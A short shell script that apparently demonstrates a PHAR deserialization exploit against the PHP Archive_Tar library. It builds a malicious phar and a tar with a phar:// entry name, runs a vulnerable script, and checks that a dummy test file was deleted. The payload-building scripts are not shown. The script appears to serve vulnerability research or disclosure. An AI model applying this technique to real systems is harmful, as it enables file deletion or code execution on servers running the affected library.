#!/bin/sh

# Create a dummy file that we aim to delete with phar unserialization
touch unserialize_test

# Check that file exists
echo "ls -lt unserialize_test => `ls -lt unserialize_test`"

# Create our phar archive with serialized metadata
php create_phar.php

# Create our tar archive with filename specified as PHAR://exploit.phar
python create_tar.py

# Call the vulnerable script that uses Archive_Tar
php vulnerable.php

# Confirm that unserialize_test created above has been deleted
echo "ls -lt unserialize_test => `ls -lt unserialize_test`"

# Cleanup
rm exploit.phar exploit.tar
